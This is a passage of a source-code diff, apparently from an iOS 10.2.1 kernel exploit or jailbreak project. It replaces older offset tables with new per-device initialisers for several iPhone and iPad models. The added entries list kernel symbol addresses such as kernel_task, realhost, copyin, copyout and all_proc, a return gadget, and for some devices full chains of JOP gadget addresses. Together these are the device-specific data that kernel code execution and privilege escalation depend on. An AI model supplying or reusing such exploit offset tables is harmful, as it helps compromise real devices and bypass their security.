-    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_S5L8960X_1630_37894221() {
-    g_offsets.kernel_base = 0xfffffff0061bc000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744ee70 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b60e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b2018 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff0061bc000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0064c1da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006f2bd88 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff0071835dc - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff0071837e4 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base;
-}
-void init_RELEASE_ARM64_T8010_1630_37893214() {
-    g_offsets.kernel_base = 0xfffffff005e64000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b860 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff007491a3c - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075f60e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073f57f0 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff005e64000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00756e678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff0063abda0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e51548 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00756e628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b86d - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff0071c8558 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075f0478 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff0071c8838 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070efcec - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d5d1 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e416 - g_offsets.kernel_base;
-}
+
+// iPhone 6 - iOS 10.2 (14C92)
 void init_RELEASE_ARM64_T7000_1630_37893214() {
-    g_offsets.kernel_base = 0xfffffff0060cc000;
-    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00745b0dc - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073be284 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff0060cc000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006455da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006ef4b08 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff00718f748 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff00718f950 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
+    g_offsets.kernel_base = 0xFFFFFFF0060CC000; // same
+    g_offsets.main_kernel_base = 0xFFFFFFF007004000; // added
+    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // added
+    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // added
+    g_offsets.l1icachesize_string = 0xFFFFFFF007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00745b0dc - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xFFFFFFF0073BE284 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00753A678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xFFFFFFF00753A628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xFFFFFFF007057890 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF00718F748 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF00718F950 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xFFFFFFF0070B6DD0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xFFFFFFF007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xFFFFFFF00706A407 - g_offsets.kernel_base; // same
 }
-void init_RELEASE_ARM64_S8000_1630_37894221() {
-    g_offsets.kernel_base = 0xfffffff00605c000;
-    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base;
-    g_offsets.osserializer_serialize = 0xfffffff00744df80 - g_offsets.kernel_base;
-    g_offsets.kern_proc = 0xfffffff0075b20e0 - g_offsets.kernel_base;
-    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base;
-    g_offsets.kernel_base = 0xfffffff00605c000 - g_offsets.kernel_base;
-    g_offsets.sysctl_hw_family = 0xfffffff00752a678 - g_offsets.kernel_base;
-    g_offsets.ret_gadget = 0xfffffff006411da0 - g_offsets.kernel_base;
-    g_offsets.iofence_vtable_offset = 0xfffffff006e83b88 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base;
-    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base;
-    g_offsets.copyin = 0xfffffff007182af0 - g_offsets.kernel_base;
-    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base;
-    g_offsets.copyout = 0xfffffff007182cf8 - g_offsets.kernel_base;
-    g_offsets.panic = 0xfffffff0070aabb0 - g_offsets.kernel_base;
-    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base;
-    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base;
+
+
+// iPhone 6 (N61AP) - iOS 10.2.1 (14D27)
+void set_n61ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF0060C8000; // updated
+    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // added
+    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // added
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
+    
+    g_offsets.jop_GADGET_PROLOGUE_1       = 0xfffffff00671c214 - g_offsets.kernel_base;
+    g_offsets.jop_LDP_X2_X1_X1__BR_X2     = 0xfffffff006b474a4 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X23_X0__BLR_X8      = 0xfffffff007485794 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_INITIALIZE_X20_1 = 0xfffffff006633d44 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X25_X0__BLR_X8      = 0xfffffff0073ca478 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_POPULATE_1       = 0xfffffff006d47820 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X19_X9__BR_X8       = 0xfffffff006c179cc - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X20_X12__BR_X8      = 0xfffffff006bdd950 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X21_X5__BLR_X8      = 0xfffffff0069ada78 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X22_X6__BLR_X8      = 0xfffffff00698c87c - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X0_X3__BLR_X8       = 0xfffffff00741bd44 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X24_X4__BR_X8       = 0xfffffff0069ade74 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X8_X10__BR_X11      = 0xfffffff0069e7c38 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_CALL_FUNCTION_1  = 0xfffffff0074a49dc - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_STORE_RESULT_1   = 0xfffffff006844394 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_EPILOGUE_1       = 0xfffffff00708c6d8 - g_offsets.kernel_base;
+
+    g_offsets.mount_common = 0xFFFFFFF0071C8E9C - g_offsets.kernel_base;
+    g_offsets.vfs_context_current = 0xFFFFFFF0071DFC90 - g_offsets.kernel_base;
+    g_offsets.copyinstr = 0xFFFFFFF0071DFC90 - g_offsets.kernel_base;
+    
+    // Not needed for 10.2.x - just testing stuff
+    g_offsets.kernel_map = 0xFFFFFFF0075C2058 - g_offsets.kernel_base; // added
+    g_offsets.zone_map = 0xFFFFFFF007566360 - g_offsets.kernel_base; // added
+    g_offsets.mach_vm_remap = 0xFFFFFFF007166100 - g_offsets.kernel_base; // added
+    g_offsets.ipc_port_make_send = 0xFFFFFFF0070A5D44 - g_offsets.kernel_base; // added
+    g_offsets.ipc_port_alloc_special = 0xFFFFFFF0070A6200 - g_offsets.kernel_base; // added
+    g_offsets.ipc_space_kernel = 0xFFFFFFF007547308 - g_offsets.kernel_base; // added
+    g_offsets.ipc_kobject_set = 0xFFFFFFF0070B98A0 - g_offsets.kernel_base; // added
+    g_offsets.mach_vm_wire = 0xfffffff007166b98 - g_offsets.kernel_base; // added
+}
+
+// iPhone 6 Plus (N56AP) - iOS 10.2.1 (14D27)
+void set_n56ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF0060C8000; // same
+    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
+}
+
+// iPhone SE (N69AP) - iOS 10.2.1 (14D27)
+void set_n69ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006078000; // updated
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // added
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // added
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // updated
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // updated
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // updated
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E8BB88 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // updated
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // updated
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // updated
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+}
+
+// iPhone SE (N69uAP) - iOS 10.2.1 (14D27)
+void set_n69uap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006078000; // updated
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // added
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // added
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // updated
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // updated
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // updated
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E8BB88 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // updated
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // updated
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // updated
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+}
+
+// iPhone 6s (N71AP) - iOS 10.2.1 (14D27)
+void set_n71ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF00605C000; // added
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+
+    g_offsets.jop_GADGET_PROLOGUE_1       = 0xfffffff006715214 - g_offsets.kernel_base;
+    g_offsets.jop_LDP_X2_X1_X1__BR_X2     = 0xfffffff006bd64a4 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X23_X0__BLR_X8      = 0xfffffff007478614 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_INITIALIZE_X20_1 = 0xfffffff0064ebd44 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X25_X0__BLR_X8      = 0xfffffff0073bd2fc - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_POPULATE_1       = 0xfffffff006d6c820 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X19_X9__BR_X8       = 0xfffffff0069239cc - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X20_X12__BR_X8      = 0xfffffff0068e9950 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X21_X5__BLR_X8      = 0xfffffff0067fda78 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X22_X6__BLR_X8      = 0xfffffff00689e87c - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X0_X3__BLR_X8       = 0xfffffff00740ebc8 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X24_X4__BR_X8       = 0xfffffff0067fde74 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X8_X10__BR_X11      = 0xfffffff006837c38 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_CALL_FUNCTION_1  = 0xfffffff00749785c - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_STORE_RESULT_1   = 0xfffffff0064f9394 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_EPILOGUE_1       = 0xfffffff0070806d8 - g_offsets.kernel_base;
+}
+
+// iPhone 6s (N71mAP) - iOS 10.2.1 (14D27)
+void set_n71map_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+}
+
+// iPhone 6s Plus (N66AP) - iOS 10.2.1 (14D27)
+void set_n66ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+}
+
+// iPhone 6s Plus (N66mAP) - iOS 10.2.1 (14D27)
+void set_n66map_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
+    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
+}
+
+// iPad Mini 4 (J96AP) - iOS 10.2.1 (14D27)
+void set_j96ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006068000; // updated
+    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006ED8748 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
+    
+}
+
+// iPad Mini 4 (J97AP) - iOS 10.2.1 (14D27)
+void set_j97ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006068000; // same
+    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
+    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006ED8748 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
